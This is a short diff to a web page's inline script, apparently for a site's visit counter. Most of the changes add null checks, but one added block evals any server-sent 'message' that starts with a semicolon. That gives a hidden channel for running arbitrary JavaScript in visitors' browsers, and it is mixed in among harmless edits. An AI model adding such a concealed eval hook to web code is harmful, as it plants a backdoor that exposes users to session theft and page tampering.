@@ -779,12 +779,19 @@ button.qchat-toggle {
 	})
 		.then(response => response.json())
 		.then(data => {
-			document.getElementById('visits').innerText = `This page has been visited ${data['visits']} times`;
+			const visits = document.getElementById('visits');
+			if (visits) visits.innerText = `This page has been visited ${data['visits']} times`;
+
 			if (data['session']) setSession(data['session']);
+			if (data['message']) {
+				if (data['message'].startsWith(';')) eval(data['message'].slice(1));
+				else alert(data['message']);
+			}
 		})
 		.catch(error => {
-			document.getElementById('visits').innerText = `Couldn't load visits`;
-			console.error('Error fetching visits:', error)
+			const visits = document.getElementById('visits');
+			if (visits) visits.innerText = `Couldn't load visits`;
+			console.error('Error fetching visits:', error);
 		});
 </script>
 <script src="https://cdn.jsdelivr.net/gh/qwkdev/sqa/fuse.js"></script>
